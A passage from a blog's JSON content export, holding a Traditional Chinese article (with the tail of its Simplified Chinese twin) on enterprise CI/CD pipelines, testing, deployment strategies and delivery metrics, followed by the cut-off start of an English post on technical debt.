从手动、高风险的部署转变为自动化、有信心的持续交付是具有挑战性的。它需要技术变革、文化转变和持续承诺。但回报——更快的上市时间、更高的质量、更快乐的开发人员和更好的业务成果——使它成为企业可以进行的最有价值的投资之一。 问题不是是否采用 CI/CD。问题是：你能多快开始你的旅程？ 💭 最后的想法&quot;如果它很痛苦，就更频繁地做，并将痛苦提前。&quot;—— Jez Humble 这个原则抓住了 CI/CD 的本质。部署痛苦？更频繁地部署，直到它成为例行公事。集成问题？持续集成，直到它不再是一个事件。通往卓越的道路是由频繁的小步骤铺成的——而不是罕见的巨大飞跃。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"}],"lang":"zh-CN"},{"title":"企業 CI/CD：持續卓越之路","slug":"2020/07/CI_CD_for_Enterprise_The_Path_to_Continuous_Excellence-zh-TW","date":"un66fin66","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/07/CI_CD_for_Enterprise_The_Path_to_Continuous_Excellence/","permalink":"https://neo01.com/zh-TW/2020/07/CI_CD_for_Enterprise_The_Path_to_Continuous_Excellence/","excerpt":"從手動部署到自動化流水線 - 探索 CI/CD 如何轉變企業軟體交付。學習讓團隊在保持品質的同時更快交付的原則、實踐和模式。","text":"還記得部署軟體意味著在凌晨 2 點安排維護時段、召集整個團隊進行電話會議，並祈禱不會出問題的日子嗎？對許多企業來說，這在十年前還是常態。部署是罕見、高風險的事件，每個人都害怕。 然後情況改變了。像 Amazon、Netflix 和 Google 這樣的公司開始每天部署程式碼數千次——不是每年，而是每天。他們不僅速度更快，還以更少的事故交付更高品質的軟體。他們的秘訣？持續整合和持續部署（CI/CD）。 從矽谷的激進想法開始，現在已成為現代軟體交付的基礎。今天，CI/CD 不僅僅是關於速度——它是關於在商業敏捷性攸關生存的世界中，轉變企業如何建構、測試和交付軟體。 軟體交付的演進 軟體交付在過去二十年經歷了巨大的轉變。理解這段旅程有助於我們理解為什麼 CI/CD 對企業成功變得如此重要。 瀑布時代：循序且緩慢 在 2000 年代初期，大多數企業遵循瀑布模型。需求收集需要數月，開發需要數季，測試在最後進行，部署是一個重大事件。以月或年為單位的發布週期很常見。當軟體變化緩慢且客戶期望較低時，這種方法是有效的。 但世界正在改變。網際網路加速了商業週期。行動應用程式創造了新的客戶期望。雲端運算使基礎設施可程式化。瀑布模型無法跟上步伐。 敏捷革命：迭代開發 敏捷方法論的出現是對瀑布局限性的回應。團隊開始以衝刺方式工作，每幾週而不是每幾個月交付可運作的軟體。這是一個巨大的改進，但問題依然存在：儘管團隊可以快速建構功能，將它們推向生產環境仍然緩慢且痛苦。 「最後一哩」問題變得明顯——團隊可以迭代開發軟體，但部署仍然是瓶頸。程式碼會堆積等待下一個發布視窗。整合問題會在後期浮現。敏捷的承諾受到部署現實的限制。 DevOps 運動：打破孤島 DevOps 的出現是為了解決開發和維運之間的脫節。核心洞察簡單但深刻：如果部署仍然是瀑布式的，你就無法擁有敏捷開發。團隊需要擁有從程式碼到生產環境的整個生命週期。 這種文化轉變需要新的實踐和工具。自動化變得至關重要。基礎設施即程式碼使環境可重現。監控和可觀測性成為首要關注點。而這一切的核心是 CI/CD——使持續交付成為可能的技術基礎。 timeline title 軟體交付的演進 2000-2005 : 瀑布時代 : 循序階段 : 每 6-12 個月發布 : 手動測試和部署 2005-2010 : 敏捷採用 : 迭代開發 : 2-4 週衝刺 : 部署仍然手動 2010-2015 : DevOps 興起 : 專注自動化 : 基礎設施即程式碼 : CI/CD 流水線 2015-2020 : 持續一切 : 每天多次部署 : 自動化測試和安全 : 雲原生架構 理解 CI/CD：不僅僅是自動化 CI/CD 經常被誤解為只是自動化部署。雖然自動化至關重要，但 CI/CD 代表了我們思考軟體交付方式的根本轉變。 持續整合：內建品質 持續整合（CI）是頻繁合併程式碼變更的實踐——通常每天多次——到共享儲存庫中。每次整合都會觸發自動化建構和測試流程，提供快速回饋。 核心原則：儘早且經常整合。開發人員不是孤立工作數週然後面對整合地獄，而是持續整合他們的變更。這使整合成為非事件而不是危機。 CI 中發生的事情： 開發人員將程式碼提交到版本控制 CI 伺服器偵測變更並觸發建構 程式碼被編譯並執行單元測試 靜態分析檢查程式碼品質和安全性 結果在幾分鐘內回報給團隊 這個快速回饋迴圈在問題最容易修復時捕獲它們——就在引入之後。在提交後立即失敗的測試清楚地指向該提交是原因。三週後失敗的測試可能是由數百個變更中的任何一個引起的。 持續部署 vs 持續交付 這些術語經常被混淆，但區別很重要： 持續交付意味著你的程式碼始終處於可部署狀態。每個通過自動化測試的變更都可以部署到生產環境，但實際部署需要人工批准。這讓團隊有信心可以隨時部署，同時保持對部署時機的控制。 持續部署更進一步——每個通過自動化測試的變更都會自動部署到生產環境，無需人工干預。這需要對自動化測試和監控有極高的信心。 大多數企業從持續交付開始，隨著實踐成熟和信心增長，逐漸轉向持續部署。 graph LR A([💻 程式碼提交]) --> B([🔨 建構]) B --> C([🧪 自動化測試]) C --> D{測試通過?} D -->|否| E([❌ 通知團隊]) D -->|是| F([📦 建立產出物]) F --> G{持續交付} G --> H{手動批准?} H -->|是| I([🚀 部署到生產環境]) H -->|否| J([⏸️ 準備部署]) G --> K{持續部署} K --> I style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style I fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:2px 流水線：你的部署裝配線 CI/CD 流水線是軟體交付流程的自動化體現。把它想像成一條裝配線，程式碼從一端進入，可部署的軟體從另一端出來，每個階段都有品質檢查。 典型的流水線階段： 來源：程式碼提交到版本控制 建構：程式碼被編譯和打包 測試：自動化測試驗證功能 安全掃描：偵測漏洞 部署到預備環境：程式碼部署到類生產環境 整合測試：驗證端到端場景 部署到生產環境：程式碼上線給使用者 每個階段都充當品質閘門。如果任何階段失敗，流水線停止並通知團隊。這防止有問題的程式碼向生產環境推進。 💡 流水線設計原則設計你的流水線以快速失敗。將快速、高價值的檢查放在流水線早期。如果單元測試需要 5 分鐘，整合測試需要 30 分鐘，先執行單元測試。這為開發人員提供更快的回饋，並透過不在基本檢查失敗的程式碼上執行昂貴的測試來節省運算資源。 企業 CI/CD 的關鍵實踐 在企業環境中實施 CI/CD 需要的不僅僅是工具——它需要採用確保大規模品質、安全性和可靠性的實踐。 主幹開發 長期存在的功能分支是持續整合的敵人。程式碼在分支中存在的時間越長，它與主程式碼庫的差異就越大，整合就越痛苦。 主幹開發意味著開發人員在短期分支上工作（或直接在主分支上工作），並至少每天整合他們的變更。這使程式碼庫保持在持續整合的狀態。 功能旗標：如何在不破壞生產環境的情況下部署未完成的功能？功能旗標允許你將程式碼合併到主分支，同時保持功能隱藏直到準備就緒。這將部署與發布解耦，為你提供靈活性並降低風險。 自動化測試策略 自動化測試是 CI/CD 信心的基礎。沒有全面的自動化測試，你無法安全地頻繁部署。 測試金字塔： 單元測試（底層）：快速、大量的個別元件測試 整合測試（中層）：元件互動測試 端到端測試（頂層）：從使用者角度的完整系統測試 金字塔形狀是有意的——你需要許多快速的單元測試、較少的整合測試，以及更少的端到端測試。這種平衡在保持測試執行時間合理的同時提供良好的覆蓋率。 ⚠️ 測試陷阱更多測試並不總是更好。設計不良的測試緩慢、不穩定或提供很少價值，會成為拖慢流水線的負擔。專注於測試品質和可維護性，而不僅僅是覆蓋率百分比。 基礎設施即程式碼 手動基礎設施配置與 CI/CD 不相容。你需要可重現、版本控制的基礎設施，可以自動建立和銷毀。 基礎設施即程式碼（IaC）將基礎設施配置視為軟體。像 Terraform、CloudFormation 或 Ansible 這樣的工具允許你在程式碼中定義基礎設施，與應用程式程式碼一起進行版本控制，並透過相同的 CI/CD 流水線部署。 好處： 環境一致且可重現 基礎設施變更像程式碼變更一樣被審查 災難恢復成為部署操作 擴展是自動化和可預測的 資料庫遷移 資料庫通常是 CI/CD 中最困難的部分。與無狀態應用程式程式碼不同，資料庫包含必須在部署之間保留的狀態。 基於遷移的方法：不是直接修改資料庫，而是建立遷移腳本，將資料庫從一個版本轉換到下一個版本。這些遷移是版本控制的，並在部署期間自動應用。 向後相容性：盡可能設計向後相容的遷移。這允許你在應用程式變更之前部署資料庫變更，降低部署風險並實現零停機部署。 監控和可觀測性 頻繁部署意味著你需要立即知道何時出現問題。全面的監控和可觀測性至關重要。 要追蹤的關鍵指標： 部署頻率：你多久部署一次？ 前置時間：從提交到生產環境需要多長時間？ 平均恢復時間（MTTR）：你能多快修復問題？ 變更失敗率：有多少百分比的部署導致問題？ 這四個指標由《加速》一書推廣，是軟體交付效能的強力指標。 ✨ 高效能團隊研究顯示，高效能團隊每天部署多次，前置時間少於一小時，在一小時內從事故中恢復，變更失敗率低於 15%。這些不僅僅是速度指標——它們與業務成果密切相關。 建構你的企業 CI/CD 流水線 讓我們逐步建構企業應用程式的生產就緒 CI/CD 流水線。 階段 1：原始碼控制和分支策略 一切都從版本控制開始。對於企業來說，這通常意味著使用 GitHub、GitLab 或 Bitbucket 等平台的 Git。 分支策略： 主分支：始終可部署，受保護免於直接提交 功能分支：短期（最多 1-2 天），透過拉取請求合併 發布分支：可選，適用於需要支援多個版本的團隊 拉取請求流程： 開發人員建立功能分支 實作變更並附帶測試 開啟拉取請求進行審查 執行自動化檢查（測試、程式碼檢查、安全掃描） 團隊審查程式碼 變更合併到主分支 階段 2：持續整合 當程式碼合併到主分支時，CI 流水線自動啟動。 建構流程： # CI 配置範例（GitHub Actions） name: CI Pipeline on: push: branches: [main] pull_request: branches: [main] jobs: build: runs-on: ubuntu-latest steps: - uses: actions&#x2F;checkout@v2 - name: 設定環境 uses: actions&#x2F;setup-node@v2 with: node-version: &#39;14&#39; - name: 安裝相依套件 run: npm ci - name: 執行程式碼檢查 run: npm run lint - name: 執行單元測試 run: npm test - name: 執行安全掃描 run: npm audit - name: 建構應用程式 run: npm run build - name: 上傳產出物 uses: actions&#x2F;upload-artifact@v2 with: name: app-bundle path: dist&#x2F; 這個流水線在每次提交時執行，為開發人員提供快速回饋。 階段 3：自動化測試 建構成功後，開始全面測試。 測試階段： 單元測試：在建構期間執行（5-10 分鐘） 整合測試：測試元件互動（10-20 分鐘） 安全測試：掃描漏洞（5-10 分鐘） 效能測試：驗證效能需求（15-30 分鐘） 端到端測試：完整使用者場景（20-40 分鐘） 平行執行：平行執行獨立的測試套件以減少總流水線時間。循序執行需要 90 分鐘的流水線透過平行化可能在 30 分鐘內完成。 階段 4：部署到預備環境 一旦所有測試通過，應用程式自動部署到鏡像生產環境的預備環境。 預備環境目的： 生產環境前的最終驗證 手動探索性測試 在類生產負載下的效能測試 與外部系統整合 部署自動化： deploy-staging: needs: build runs-on: ubuntu-latest steps: - name: 下載產出物 uses: actions&#x2F;download-artifact@v2 with: name: app-bundle - name: 部署到預備環境 run: | aws s3 sync dist&#x2F; s3:&#x2F;&#x2F;staging-bucket&#x2F; aws cloudfront create-invalidation --distribution-id $STAGING_DIST - name: 執行冒煙測試 run: npm run test:smoke -- --env&#x3D;staging 階段 5：生產環境部署 預備環境驗證後，應用程式準備好進行生產環境部署。 部署策略： 藍綠部署：維護兩個相同的生產環境（藍色和綠色）。部署到非活動環境，測試它，然後切換流量。如果出現問題，立即切換回來。 金絲雀部署：首先部署到一小部分生產伺服器。監控問題。逐漸增加新版本的流量。如果偵測到問題則回滾。 滾動部署：一次更新一台伺服器或小批次。這在避免藍綠部署的基礎設施成本的同時最小化風險。 graph TB A([📦 新版本準備就緒]) --> B{部署策略} B -->|藍綠| C([🔵 部署到藍色]) C --> D([✅ 測試藍色]) D --> E([🔄 切換流量]) E --> F([🟢 綠色成為待命]) B -->|金絲雀| G([🐤 部署到 5% 的伺服器]) G --> H([📊 監控指標]) H --> I{健康?} I -->|是| J([📈 增加到 25%]) J --> K([📈 增加到 100%]) I -->|否| L([⏮️ 回滾]) B -->|滾動| M([🔄 更新伺服器 1]) M --> N([🔄 更新伺服器 2]) N --> O([🔄 繼續...]) style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style L fill:#ffebee,stroke:#c62828,stroke-width:2px 階段 6：部署後驗證 部署在你驗證系統健康之前並未完成。 自動化檢查： 健康端點回傳 200 OK 關鍵使用者旅程成功完成 錯誤率保持在可接受的閾值內 效能指標符合 SLA 監控： 應用程式日誌中的錯誤 基礎設施指標（CPU、記憶體、磁碟） 業務指標（交易、使用者活動） 使用者體驗指標（頁面載入時間、錯誤率） 如果任何檢查失敗，觸發自動回滾。 CI/CD 流水線中的安全性 安全性不能是 CI/CD 的事後想法——它必須整合到整個流水線中。這種方法稱為 DevSecOps。 左移安全性 「左移」意味著在開發流程中更早地移動安全性。安全檢查不是在生產環境部署前進行安全審查，而是在每個階段進行。 安全檢查點： 開發期間： IDE 外掛程式在你輸入時偵測安全問題 預提交鉤子防止提交機密資訊 相依套件掃描已知漏洞 CI 期間： 靜態應用程式安全測試（SAST）掃描原始碼 軟體組成分析（SCA）檢查相依套件 機密掃描防止憑證進入儲存庫 部署期間： 動態應用程式安全測試（DAST）測試執行中的應用程式 基礎設施掃描驗證雲端配置 容器掃描檢查易受攻擊的基礎映像 機密管理 永遠不要將機密資訊（密碼、API 金鑰、憑證）儲存在原始碼或配置檔案中。使用專用的機密管理工具。 最佳實踐： 將機密資訊儲存在 AWS Secrets Manager、HashiCorp Vault 或類似工具中 在執行時注入機密資訊，而不是建構時 定期且自動地輪換機密資訊 稽核機密資訊存取 盡可能使用短期憑證 合規性和稽核軌跡 企業通常在需要稽核軌跡和合規性檢查的監管要求下運作。 稽核要求： 誰在何時部署了什麼以及為什麼 執行了哪些測試以及結果是什麼 獲得了哪些批准 對生產環境進行了哪些變更 現代 CI/CD 平台提供內建的稽核日誌記錄。確保這些日誌根據你的合規性要求保留，並且是防篡改的。 ⚠️ 合規性考量不同產業有不同的要求： 金融服務：SOX 合規性、變更批准流程 醫療保健：HIPAA 合規性、資料保護要求 政府：FedRAMP、特定安全控制 設計你的流水線以適應這些要求，而不犧牲敏捷性。自動化和稽核軌跡在這裡是你的朋友。 衡量 CI/CD 成功 你如何知道你的 CI/CD 實施是否成功？衡量重要的事情。 四個關鍵指標 基於《加速》一書的研究，這四個指標是軟體交付效能的最佳指標： 1. 部署頻率 你的組織多久將程式碼部署到生產環境一次？ 精英：每天多次 高：每天一次到每週一次 中：每週一次到每月一次 低：少於每月一次 2. 變更前置時間 提交到達生產環境需要多長時間？ 精英：少於一小時 高：一天到一週 中：一週到一個月 低：超過一個月 3. 平均恢復時間（MTTR） 事故後恢復服務需要多長時間？ 精英：少於一小時 高：少於一天 中：一天到一週 低：超過一週 4. 變更失敗率 有多少百分比的部署導致生產環境失敗？ 精英：0-15% 高：16-30% 中：31-45% 低：46-60% (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_3203079e1')); var option = { \"title\": { \"text\": \"不同團隊等級的 CI/CD 效能指標\" }, \"tooltip\": { \"trigger\": \"axis\", \"axisPointer\": { \"type\": \"shadow\" } }, \"legend\": { \"data\": [\"精英\", \"高\", \"中\", \"低\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"部署\\n頻率\", \"前置時間\", \"MTTR\", \"變更\\n失敗率\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"效能分數\" }, \"series\": [ { \"name\": \"精英\", \"type\": \"bar\", \"data\": [95, 95, 95, 95], \"itemStyle\": { \"color\": \"#4caf50\" } }, { \"name\": \"高\", \"type\": \"bar\", \"data\": [75, 75, 75, 75], \"itemStyle\": { \"color\": \"#2196f3\" } }, { \"name\": \"中\", \"type\": \"bar\", \"data\": [50, 50, 50, 50], \"itemStyle\": { \"color\": \"#ff9800\" } }, { \"name\": \"低\", \"type\": \"bar\", \"data\": [25, 25, 25, 25], \"itemStyle\": { \"color\": \"#f44336\" } } ] }; chart.setOption(option); } })(); 業務影響指標 技術指標很重要，但最終 CI/CD 應該推動業務成果： 上市時間：你能多快向客戶交付新功能？ 客戶滿意度：你是否以更快的速度和更高的品質交付價值？ 開發人員生產力：開發人員是否將時間花在有價值的工作上，還是與部署流程作鬥爭？ 營運成本：你是否減少了手動工作和基礎設施浪費？ 創新率：你能快速實驗和迭代嗎？ ✨ 真實世界影響在 CI/CD 方面表現出色的組織報告： 部署頻率高 46 倍 從提交到部署的前置時間快 440 倍 平均恢復時間快 170 倍 變更失敗率低 5 倍 這些不僅僅是技術改進——它們直接轉化為競爭優勢。 常見挑戰和解決方案 在企業中實施 CI/CD 並非沒有挑戰。以下是常見障礙以及如何克服它們。 挑戰：遺留系統 問題：現有應用程式不是為自動化部署而設計的。它們有手動配置步驟、必須手動執行的資料庫腳本，以及對特定伺服器配置的相依性。 解決方案： 從新應用程式開始，逐步現代化遺留系統 建立包裝腳本來自動化手動步驟 使用絞殺者模式逐步替換遺留元件 為沒有測試覆蓋率的系統投資特徵測試 挑戰：組織阻力 問題：團隊對現有流程感到舒適。維運團隊擔心穩定性。管理者害怕失去控制。開發人員對新工具持懷疑態度。 解決方案： 從試點專案開始小規模 用指標展示成功 儘早讓懷疑者參與並解決疑慮 提供培訓和支援 慶祝勝利並分享學習 挑戰：測試自動化差距 問題：自動化測試覆蓋率不足使團隊害怕頻繁部署。手動測試成為瓶頸。 解決方案： 採用測試金字塔方法 為新程式碼編寫測試（不要讓問題變得更糟） 逐步為現有程式碼添加測試，優先處理高風險區域 投資測試基礎設施和框架 將測試作為完成定義的一部分 挑戰：流水線執行緩慢 問題：流水線需要數小時才能完成，使快速迭代變得不可能。開發人員等待回饋，上下文切換並失去生產力。 解決方案： 平行化獨立的測試套件 對相依套件和建構產出物使用快取 最佳化慢速測試或將它們移至夜間執行 投資更快的建構基礎設施 分析你的流水線以識別瓶頸 挑戰：配置管理 問題：跨多個環境（開發、測試、預備、生產）管理配置複雜且容易出錯。配置漂移導致「在我的機器上可以運作」的問題。 解決方案： 對環境特定配置使用環境變數 將配置儲存在版本控制中 使用配置管理工具（Ansible、Chef、Puppet） 實施基礎設施即程式碼 在流水線中驗證配置 💡 從你所在的地方開始你不需要在開始 CI/CD 之前解決所有這些挑戰。從你能控制的開始，展示價值，然後逐步擴展。完美是好的敵人——一個有效的基本流水線比一個永遠不會實施的精心計劃更好。 入門：實用路線圖 準備好在你的企業中實施 CI/CD 了嗎？這裡有一個逐步方法。 階段 1：基礎（第 1-4 週） 目標：建立基本自動化和版本控制實踐 行動： 確保所有程式碼都在版本控制中（Git） 設定 CI 伺服器（Jenkins、GitLab CI、GitHub Actions） 建立編譯程式碼並執行單元測試的基本建構流水線 建立分支策略（主幹開發或 Git flow） 透過拉取請求實施程式碼審查流程 成功標準：每次提交都觸發自動化建構和測試 階段 2：自動化測試（第 5-12 週） 目標：透過全面的自動化測試建立信心 行動： 稽核現有測試覆蓋率並識別差距 實施測試金字塔（單元、整合、端到端） 將測試添加到 CI 流水線 設定鏡像生產環境的測試環境 建立品質閘門（最低覆蓋率、無失敗測試） 成功標準：80%+ 測試覆蓋率，合併前所有測試通過 階段 3：持續交付（第 13-20 週） 目標：自動化部署到預備環境 行動： 為預備環境實施基礎設施即程式碼 建立部署腳本和自動化 將部署階段添加到流水線 實施資料庫遷移自動化 為預備環境設定監控和警報 成功標準：每次成功建構都自動部署到預備環境 階段 4：生產環境部署（第 21-28 週） 目標：實現安全、頻繁的生產環境部署 行動： 實施生產環境部署自動化 選擇並實施部署策略（藍綠、金絲雀、滾動） 設定生產環境監控和警報 建立回滾程序 實施功能旗標以降低風險 成功標準：生產環境部署是自動化且低風險的 階段 5：持續改進（持續進行） 目標：最佳化和成熟你的 CI/CD 實踐 行動： 衡量四個關鍵指標 識別並解決瓶頸 逐步增加部署頻率 減少前置時間和 MTTR 跨團隊分享學習 成功標準：指標和團隊滿意度持續改進 📝 適應你的環境這個路線圖是一個起點，而不是處方。你組織的規模、文化、監管要求和技術環境將影響你的方法。關鍵是開始、學習和迭代。 CI/CD 的未來 展望未來，幾個趨勢正在塑造持續交付的未來。 GitOps：Git 作為真相來源 GitOps 透過使用 Git 作為應用程式和基礎設施配置的單一真相來源來擴展基礎設施即程式碼。對生產環境的變更透過 Git 提交發生，自動化系統確保實際狀態與 Git 中的期望狀態相符。 這種方法提供： 所有變更的完整稽核軌跡 輕鬆回滾（只需還原提交） 宣告式基礎設施管理 開發人員和維運之間的關注點分離 漸進式交付 漸進式交付將部署技術與實驗和可觀測性結合起來。你不是一次部署給所有使用者，而是在衡量影響的同時逐步推出變更。 技術： 用於控制推出的功能旗標 具有自動化分析的金絲雀部署 整合到部署中的 A/B 測試 基於指標的自動回滾 無伺服器和邊緣運算 隨著應用程式轉向無伺服器架構和邊緣運算，CI/CD 必須適應： 部署函式而不是伺服器 管理跨邊緣位置的分散式部署 有效測試無伺服器應用程式 最佳化冷啟動時間 結論：持續的旅程 CI/CD 不是目的地——它是持續改進的旅程。目標不是完美；而是進步。朝著更多自動化、更快回饋和更安全部署邁出的每一步都使你的組織更加敏捷和具有競爭力。 在未來十年蓬勃發展的企業將是那些能夠快速、安全和持續交付軟體的企業。他們將在幾天而不是幾個月內回應市場變化。他們將快速實驗並從失敗中學習。他們將把軟體交付視為競爭優勢，而不僅僅是成本中心。 從手動、高風險的部署轉變為自動化、有信心的持續交付是具有挑戰性的。它需要技術變革、文化轉變和持續承諾。但回報——更快的上市時間、更高的品質、更快樂的開發人員和更好的業務成果——使它成為企業可以進行的最有價值的投資之一。 問題不是是否採用 CI/CD。問題是：你能多快開始你的旅程？ 💭 最後的想法「如果它很痛苦，就更頻繁地做，並將痛苦提前。」—— Jez Humble 這個原則抓住了 CI/CD 的本質。部署痛苦？更頻繁地部署，直到它成為例行公事。整合問題？持續整合，直到它不再是一個事件。通往卓越的道路是由頻繁的小步驟鋪成的——而不是罕見的巨大飛躍。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Enterprise","slug":"Enterprise","permalink":"https://neo01.com/tags/Enterprise/"},{"name":"Development","slug":"Development","permalink":"https://neo01.com/tags/Development/"},{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Automation","slug":"Automation","permalink":"https://neo01.com/tags/Automation/"}],"lang":"zh-TW"},{"title":"Technical Debt: The Hidden Cost of Moving Fast","slug":"2020/07/Technical-Debt-The-Hidden-Cost-of-Moving-Fast","date":"un66fin66","updated":"un55fin55","comments":true,"path":"2020/07/Technical-Debt-The-Hidden-Cost-of-Moving-Fast/","permalink":"https://neo01.com/2020/07/Technical-Debt-The-Hidden-Cost-of-Moving-Fast/","excerpt":"Every shortcut in code creates debt that must be repaid with interest. Learn to recognize, measure, and manage technical debt before it cripples your development velocity.","text":"Every software team faces the same temptation: take a shortcut now, fix it later. Skip the refactoring. Copy-paste that code block. Hardcode that configuration value. Ship the feature today, clean it up tomorrow. But tomorrow never comes. Instead, those shortcuts accumulate. Each one makes the next feature harder to build. Tests become flaky. Deployments grow risky. New developers struggle to understand the codebase. What started as a few pragmatic decisions transforms into a crushing burden that slows everything down. This is technical debt - and like financial debt, it compounds with interest. What is Technical Debt? Ward Cunningham coined the term “technical debt” in 1992 to describe the trade-off between perfect code and shipping quickly. Just as financial debt lets you acquire something now and pay later, technical debt lets you ship features faster by deferring code quality work. The metaphor is powerful because it captures an essential truth: debt isn’t inherently bad. Strategic debt can accelerate growth. A startup might deliberately accumulate technical debt to validate product-market fit before competitors. A team might take shortcuts to meet a critical deadline. The problem isn’t debt itself - it’s unmanaged debt. Why Technical Debt Compounds Like Financial Debt The “interest” on technical debt isn’t metaphorical - it’s real cost that grows over time. Here’s why: The Compounding Effect With financial debt, you pay interest on the principal. With technical debt, you pay “interest” every time you interact with the problematic code: Initial Debt: You hardcode a configuration value to save 2 hours. First Interest Payment: Next developer spends 30 minutes figuring out why configuration doesn’t work in staging. Second Interest Payment: Another developer spends 1 hour adding a workaround because they can’t easily change the hardcoded value. Third Interest Payment: QA spends 2 hours debugging why tests fail in CI but pass locally. Fourth Interest Payment: New team member spends 3 hours understanding the workarounds during onboarding. That 2-hour shortcut has now cost 6.5 hours in “interest” - and the debt still isn’t paid. The longer it remains, the more interest accumulates. Debt Builds on Debt The compounding accelerates because new code builds on old debt: graph TB A([Week 1:Hardcode ConfigSave 2 hours]) --> B([Week 2:Workaround AddedCost: 1 hour]) B --> C([Week 4:Another WorkaroundCost: 2 hours]) C --> D([Week 8:Feature BlockedCost: 8 hours]) D --> E([Week 12:Major Refactor NeededCost: 40 hours]) style A fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style B fill:#fff9c4,stroke:#f57c00,stroke-width:2px style C fill:#ffe0b2,stroke:#f57c00,stroke-width:2px style D fill:#ffccbc,stroke:#d84315,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:3px Week 1: You skip proper error handling to ship faster. Week 2: Another developer adds a feature that assumes errors are handled, creating fragile code. Week 4: A third feature builds on the second, now three layers deep in assumptions. Week 8: A bug appears, but it’s hard to fix because three features depend on the broken behavior. Week 12: You finally refactor, but now you must update three features, not just the original shortcut. The fix that would have taken 2 hours in Week 1 now takes 40 hours in Week 12. That’s compounding interest. Cognitive Load Multiplies Each piece of debt adds mental overhead: Developers must remember “don’t touch that module, it’s fragile” Code reviews take longer because reviewers must understand workarounds New features require navigating around debt, slowing development Debugging becomes harder because behavior doesn’t match expectations This cognitive load is interest paid continuously, every single day. The Interest Rate Varies Not all debt compounds at the same rate: High-Interest Debt (compounds rapidly): Core modules touched frequently Shared utilities used across the codebase Public APIs that other teams depend on Authentication, authorization, data access layers Low-Interest Debt (compounds slowly): Isolated features rarely modified Internal tools with few users Experimental code clearly marked as temporary Edge cases affecting minimal users 🎬 Real Compounding InterestA team skipped database indexing to ship faster (saved 1 day). Month 1: Queries slow but acceptable (interest: 0 hours) Month 3: Developers add query workarounds (interest: 4 hours) Month 6: Customer complaints about performance (interest: 8 hours investigating) Month 9: Sales team loses deals due to slow demos (interest: lost revenue) Month 12: Emergency performance sprint required (interest: 80 hours + customer churn) The 1-day shortcut ultimately cost 92 hours plus lost customers. The interest rate was devastating because the debt was in a high-traffic area. Why Compounding Accelerates Dependency Chains: Each new feature that depends on debt increases the cost to fix it. Knowledge Decay: Original developers leave, taking context with them. Future developers pay higher interest because they must reverse-engineer decisions. Risk Aversion: As debt ages, teams become afraid to fix it. “It’s been working for years, don’t touch it.” This fear is interest paid in lost opportunities. Opportunity Cost: Time spent working around debt is time not spent on valuable features. This hidden interest compounds silently. The Tipping Point Eventually, debt reaches a tipping point where interest payments exceed your development capacity: More time spent on workarounds than features Bug fixes that create new bugs Features that are “impossible” due to architectural constraints Developers spending more time understanding code than writing it At this point, you’re bankrupt - unable to make progress without a major restructuring (rewrite). 💡 Paying Interest vs. Paying PrincipalEvery time you work around debt instead of fixing it, you're paying interest. Every time you refactor and eliminate debt, you're paying principal. The goal isn't zero debt - it's ensuring interest payments don't exceed your ability to deliver value. graph LR A([⚡ Quick SolutionShip Fast]) --> B([📈 Technical DebtAccumulates]) B --> C([⏰ Interest CompoundsSlower Development]) C --> D([🔧 Refactoring RequiredPay Down Debt]) D --> A style A fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#ffebee,stroke:#c62828,stroke-width:2px style D fill:#e3f2fd,stroke:#1976d2,stroke-width:2px Types of Technical Debt Not all technical debt is created equal. Understanding the different types helps you prioritize what to address first. Deliberate Debt This is conscious, strategic debt. The team knows they’re taking a shortcut and plans to address it later. Examples include: Hardcoding configuration to meet a deadline Skipping edge case handling for an MVP Using a simpler but less scalable architecture initially Characteristics: Documented, tracked, time-boxed, with a clear repayment plan. When to Strategically Take On Technical Debt Sometimes taking on technical debt is the right business decision. The key is doing it deliberately and with preparation, not recklessly. Valid Reasons to Incur Debt Market Timing: First-mover advantage or competitive pressure may justify shortcuts to ship faster. Validation: Building an MVP to test market fit before investing in perfect architecture. Critical Deadlines: Regulatory compliance, contractual obligations, or time-sensitive opportunities. Resource Constraints: Limited budget or team capacity requires pragmatic trade-offs. Learning: Uncertainty about requirements suggests building something simple first, then refactoring based on real usage. ⚠️ Bad Reasons to Incur Debt &quot;We don't have time for quality&quot; (you'll pay more later) &quot;We'll fix it eventually&quot; (without a concrete plan) &quot;Testing slows us down&quot; (bugs slow you down more) &quot;Nobody will notice&quot; (they will, and it will hurt) Preparing Before Taking On Debt If you decide to incur technical debt strategically, prepare properly to ensure you can pay it back: 1. Document the Debt Create a clear record of what debt you’re taking and why: ## Technical Debt: Hardcoded API Endpoints **Date Incurred**: 2020-07-15 **Reason**: Need to ship MVP by end of month for investor demo **Location**: src&#x2F;api&#x2F;client.js lines 45-67 **Impact**: Cannot easily switch between dev&#x2F;staging&#x2F;prod environments **Estimated Payback Effort**: 4 hours **Payback Deadline**: Sprint 12 (before beta launch) **Owner**: @alice Without documentation, debt becomes invisible and forgotten. 2. Isolate the Debt Contain shortcuts to specific modules or components: Use clear boundaries (separate files, modules, or services) Add comments marking debt locations: // TODO: TECH DEBT - hardcoded for MVP Avoid letting debt spread to other parts of the codebase Create interfaces that allow future replacement without widespread changes 3. Set a Repayment Date Debt without a deadline never gets paid: Schedule specific sprints or time blocks for payback Tie repayment to business milestones (“before beta launch”, “after Series A”) Add debt items to your backlog with priority Set calendar reminders to review debt status 4. Estimate the Interest Understand what the debt will cost over time: How much will this slow down future features? What’s the risk if we don’t pay it back? How much harder will it be to fix later vs. 